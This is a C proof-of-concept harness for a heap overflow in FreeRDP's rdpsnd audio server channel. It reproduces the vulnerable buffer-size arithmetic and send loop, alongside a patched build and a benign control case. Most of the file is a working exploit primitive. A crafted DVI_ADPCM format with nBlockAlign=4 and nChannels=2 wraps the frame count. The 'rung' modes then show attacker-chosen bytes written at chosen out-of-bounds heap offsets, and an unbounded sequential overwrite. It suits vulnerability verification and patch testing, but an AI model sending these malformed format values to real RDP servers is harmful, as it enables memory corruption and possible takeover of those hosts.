/*
 * Extracted harness for FreeRDP GHSA-3m9q-g533-rqjq / CVE-2026-114045.
 *
 * The arithmetic in select_format() and the copy loop in send_samples() are
 * transcribed from FreeRDP 3.32.0 channels/rdpsnd/server/rdpsnd_main.c
 * (lines 389-461 and 753-796). BUILD_FIXED applies the real 3.32.1 guard
 * ("nBlockAlign / 4 < nChannels") instead of the 3.32.0 WINPR_ASSERT floors.
 *
 * No sockets, no FreeRDP library, no network. AUDIO_FORMAT fields that matter
 * (wFormatTag, nChannels, nBlockAlign, nSamplesPerSec, wBitsPerSample) are the
 * ones a client places in an SNDC_FORMATS PDU; the sample buffer is the data a
 * client supplies to the rdpsnd channel.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define WAVE_FORMAT_PCM        0x0001u
#define WAVE_FORMAT_DVI_ADPCM  0x0011u

#define RC_OK             0u
#define RC_INVALID_DATA   1u
#define RC_NO_MEMORY      2u

#define MIN(a, b) ((a) < (b) ? (a) : (b))

typedef struct {
    uint16_t wFormatTag;
    uint32_t nChannels;
    uint32_t nSamplesPerSec;
    uint32_t nBlockAlign;
    uint16_t wBitsPerSample;
} AUDIO_FORMAT;

typedef struct {
    uint64_t out_frames;
    uint64_t out_pending_frames;
    size_t   src_bytes_per_frame;
    uint8_t *out_buffer;
    size_t   out_buffer_size;
    size_t   alloc_size;      /* tracked allocation extent, for tracing only */
    int      realloc_failed;
} CTX;

/* ---- non-ASan instrumentation: count OOB bytes and watch chosen offsets ---- */
static size_t g_oob_writes, g_first_oob, g_last_oob;
static size_t g_watch[8];
static uint8_t g_watch_val[8];
static int    g_nwatch;

static void trace_reset(void)
{
    g_oob_writes = 0;
    g_first_oob = (size_t)-1;
    g_last_oob = 0;
}

static void watch_set(const size_t *offs, uint8_t *vals, int n)
{
    g_nwatch = n;
    for (int i = 0; i < n; i++)
    {
        g_watch[i] = offs[i];
        g_watch_val[i] = vals ? vals[i] : 0;
    }
}

static void do_copy(CTX *c, uint8_t *dst, const uint8_t *src, size_t n)
{
#ifdef BUILD_ASAN
    (void)c;
    memcpy(dst, src, n);   /* let ASan see the real sink */
#else
    for (size_t i = 0; i < n; i++)
    {
        size_t off = (size_t)(dst - c->out_buffer) + i;
        dst[i] = src[i];
        if (off >= c->alloc_size)
        {
            g_oob_writes++;
            if (off < g_first_oob) g_first_oob = off;
            if (off > g_last_oob) g_last_oob = off;
        }
        for (int w = 0; w < g_nwatch; w++)
            if (off == g_watch[w]) g_watch_val[w] = src[i];
    }
#endif
}

/* ---- transcribed from rdpsnd_main.c:389-461 (3.32.0) ----------------------- */
static uint32_t select_format(CTX *c, const AUDIO_FORMAT *fmt)
{
    const uint32_t src_rate = 44100, src_bits = 16, src_ch = 2;
    const int latency = 50;

    c->src_bytes_per_frame = (size_t)(src_bits / 8) * src_ch;   /* = 4 */
    c->out_frames = (uint64_t)src_rate * latency / 1000;         /* = 2205 */
    if (c->out_frames < 1) c->out_frames = 1;

    if (fmt->wFormatTag == WAVE_FORMAT_DVI_ADPCM)
    {
#ifdef BUILD_FIXED
        /* Real 3.32.1 fix, rdpsnd_main.c:415-418 */
        if ((uint64_t)fmt->nBlockAlign / 4ull < fmt->nChannels)
            return RC_INVALID_DATA;
        if (fmt->nChannels == 0)
            return RC_INVALID_DATA;
#else
        /* 3.32.0 parse-time floors only (rdpsnd_main.c:258-265): nba < 4 rejects,
         * but the nba >= 4*nChannels consistency relation is never checked. */
        if (fmt->nBlockAlign < 4)
            return RC_INVALID_DATA;
#endif
        const uint64_t nba = fmt->nBlockAlign, nch = fmt->nChannels;
        const uint64_t bs = 4ULL * (nba - 4ULL * nch); /* wraps when nba < 4*nch */
        if (bs == 0) return RC_INVALID_DATA;           /* the older 63117 exact-zero DoS */
        c->out_frames -= c->out_frames % bs;
        if (c->out_frames < bs) c->out_frames = bs;    /* out_frames := wrapped bs */
    }

    c->out_pending_frames = 0;
    const size_t out_buffer_size = (size_t)(c->out_frames * c->src_bytes_per_frame);
    c->realloc_failed = 0;
    if (c->out_buffer_size < out_buffer_size)
    {
        uint8_t *nb = (uint8_t *)realloc(c->out_buffer, out_buffer_size);
        if (!nb)
        {
            /* 3.32.0 returns with out_frames already mutated: no rollback. */
            c->realloc_failed = 1;
            return RC_NO_MEMORY;
        }
        c->out_buffer = nb;
        c->out_buffer_size = out_buffer_size;
        c->alloc_size = out_buffer_size;
    }
    return RC_OK;
}

/* ---- transcribed from rdpsnd_main.c:753-796 (3.32.0) ----------------------- */
static uint32_t send_samples(CTX *c, const uint8_t *buf, size_t nframes)
{
    while (nframes > 0)
    {
        const size_t cframes = (size_t)MIN(nframes, (size_t)(c->out_frames - c->out_pending_frames));
        const size_t cframesize = cframes * c->src_bytes_per_frame;
        uint8_t *dst = c->out_buffer + (size_t)(c->out_pending_frames * c->src_bytes_per_frame);
        do_copy(c, dst, buf, cframesize);
        buf += cframesize;
        nframes -= cframes;
        c->out_pending_frames += cframes;
    }
    return RC_OK;
}

static CTX ctx_new(void)
{
    CTX c;
    memset(&c, 0, sizeof c);
    return c;
}

static const AUDIO_FORMAT fmt_pcm = {
    WAVE_FORMAT_PCM, 2, 44100, 176400, 16
};
/* nBlockAlign=4, nChannels=2 -> 4*(4-8) wraps to 0xFFFFFFFFFFFFFFF0 */
static const AUDIO_FORMAT fmt_dvi = {
    WAVE_FORMAT_DVI_ADPCM, 2, 44100, 4, 4
};

static void stage12(CTX *c, uint32_t *rc2)
{
    (void)select_format(c, &fmt_pcm);
    *rc2 = select_format(c, &fmt_dvi);
}

static int mode_rung1(void)
{
    CTX c = ctx_new();
    uint32_t rc2;
    stage12(&c, &rc2);
    trace_reset();

    uint8_t *buf = (uint8_t *)malloc(16384);
    memset(buf, 0x41, 16384);
    send_samples(&c, buf, 4096);   /* 4096 * 4 = 16384 bytes into 8820-byte region */

    printf("nba=4 nch=2 bs=0xfffffffffffffff0 "
           "rc2=%u out_frames=0x%016zx realloc_failed=%d\n",
           rc2, (size_t)c.out_frames, c.realloc_failed);
    printf("oob_writes=%zu first_oob=%zu last_oob=%zu "
           "copy_base_alloc=%zu\n",
           g_oob_writes, g_first_oob, g_last_oob, c.alloc_size);
    int ok = (rc2 == RC_NO_MEMORY) && (c.out_frames == 0xfffffffffffffff0ULL) &&
             (g_oob_writes == 7564) && (g_first_oob == 8820) && (g_last_oob == 16383);
    printf("[rung1] RESULT=%s\n", ok ? "PASS" : "FAIL");
    (void)buf; /* leak: OOB write corrupted the adjacent sample-buffer chunk header */
    return ok ? 0 : 1;
}

static int mode_rung2(void)
{
    CTX c = ctx_new();
    uint32_t rc2;
    stage12(&c, &rc2);
    trace_reset();

    size_t offs[2] = { 8820, 12000 };
    uint8_t exp[2] = { 0xAB, 0xCD };
    watch_set(offs, exp, 2);

    uint8_t *buf = (uint8_t *)malloc(16384);
    memset(buf, 0x41, 16384);
    buf[8820] = 0xAB; buf[12000] = 0xCD;   /* chosen bytes at chosen OOB offsets */
    send_samples(&c, buf, 4096);

    printf("wbuffer[oob=8820]=%02x (want ab)  wbuffer[oob=12000]=%02x (want cd)\n",
           g_watch_val[0], g_watch_val[1]);
    int ok = (g_watch_val[0] == 0xAB) && (g_watch_val[1] == 0xCD);
    printf("[rung2] RESULT=%s\n", ok ? "PASS" : "FAIL");
    (void)buf; /* leak: OOB write corrupted the adjacent sample-buffer chunk header */
    return ok ? 0 : 1;
}

static int mode_rung4(void)
{
    CTX c = ctx_new();
    uint32_t rc2;
    stage12(&c, &rc2);
    trace_reset();

    /* Call 1 lands at buffer offset 0..16383; call 2 lands at 16384..32767.
     * Watch two OOB offsets from different calls to show the unbounded,
     * sequential, attacker-controlled write advancing monotonically. */
    size_t offs[2] = { 8820, 16384 + 5000 };
    uint8_t exp[2] = { 0xDE, 0xAD };
    watch_set(offs, exp, 2);

    uint8_t *b1 = (uint8_t *)malloc(16384);
    uint8_t *b2 = (uint8_t *)malloc(16384);
    memset(b1, 0x11, 16384);
    memset(b2, 0x22, 16384);
    b1[8820] = 0xDE;
    b2[5000] = 0xAD;
    send_samples(&c, b1, 4096);   /* writes offsets 0..16383 */
    send_samples(&c, b2, 4096);   /* writes offsets 16384..32767 */

    printf("call1 oob offset 8820  = %02x (want de)\n", g_watch_val[0]);
    printf("call2 oob offset 21384 = %02x (want ad)\n", g_watch_val[1]);
    printf("out_pending_frames=%zu (never reaches out_frames=%zu; unbounded)\n",
           (size_t)c.out_pending_frames, (size_t)c.out_frames);
    int ok = (g_watch_val[0] == 0xDE) && (g_watch_val[1] == 0xAD) &&
             (c.out_pending_frames == 8192);
    printf("[rung4] RESULT=%s\n", ok ? "PASS" : "FAIL");
    (void)b1; (void)b2; /* leak: OOB write corrupted adjacent chunk headers */
    return ok ? 0 : 1;
}

static int mode_fixed(void)
{
    CTX c = ctx_new();
    uint32_t rc2;
    stage12(&c, &rc2);
    trace_reset();

    uint8_t *buf = (uint8_t *)malloc(8820);
    memset(buf, 0x41, 8820);
    uint32_t rcs = send_samples(&c, buf, 2205);   /* benign amount, fits 8820 */

    printf("rc2=%u (want 1 INVALID_DATA) out_frames=%zu (want 2205) "
           "realloc_failed=%d rcs=%u oob_writes=%zu\n",
           rc2, (size_t)c.out_frames, c.realloc_failed, rcs, g_oob_writes);
    int ok = (rc2 == RC_INVALID_DATA) && (c.out_frames == 2205) &&
             (!c.realloc_failed) && (g_oob_writes == 0);
    printf("[fixed] RESULT=%s\n", ok ? "PASS" : "FAIL");
    free(buf); free(c.out_buffer);
    return ok ? 0 : 1;
}

static int mode_control(void)
{
    CTX c = ctx_new();
    uint32_t rc1 = select_format(&c, &fmt_pcm);
    trace_reset();

    uint8_t *buf = (uint8_t *)malloc(8820);
    memset(buf, 0x41, 8820);
    send_samples(&c, buf, 2205);

    printf("benign PCM only: rc1=%u out_frames=%zu alloc=%zu oob_writes=%zu\n",
           rc1, (size_t)c.out_frames, c.alloc_size, g_oob_writes);
    int ok = (rc1 == RC_OK) && (g_oob_writes == 0);
    printf("[control] RESULT=%s\n", ok ? "PASS" : "FAIL");
    free(buf); free(c.out_buffer);
    return ok ? 0 : 1;
}

static int mode_asan(void)
{
    CTX c = ctx_new();
    uint32_t rc2;
    stage12(&c, &rc2);
    uint8_t *buf = (uint8_t *)malloc(16384);
    memset(buf, 0x41, 16384);
    printf("pre-asan: rc2=%u out_frames=0x%016zx realloc_failed=%d\n",
           rc2, (size_t)c.out_frames, c.realloc_failed);
    fflush(stdout);
    send_samples(&c, buf, 4096);   /* ASan must report heap-buffer-overflow here */
    printf("post-asan: no report (UNEXPECTED)\n");
    (void)buf; (void)c.out_buffer; /* ASan halts before any free of corrupted memory */
    return 0;
}

int main(int argc, char **argv)
{
    const char *m = argc > 1 ? argv[1] : "rung1";
    if (!strcmp(m, "rung1")) return mode_rung1();
    if (!strcmp(m, "rung2")) return mode_rung2();
    if (!strcmp(m, "rung4")) return mode_rung4();
    if (!strcmp(m, "fixed")) return mode_fixed();
    if (!strcmp(m, "control")) return mode_control();
    if (!strcmp(m, "asan")) return mode_asan();
    fprintf(stderr, "usage: %s rung1|rung2|rung4|fixed|control|asan\n", argv[0]);
    return 2;
}
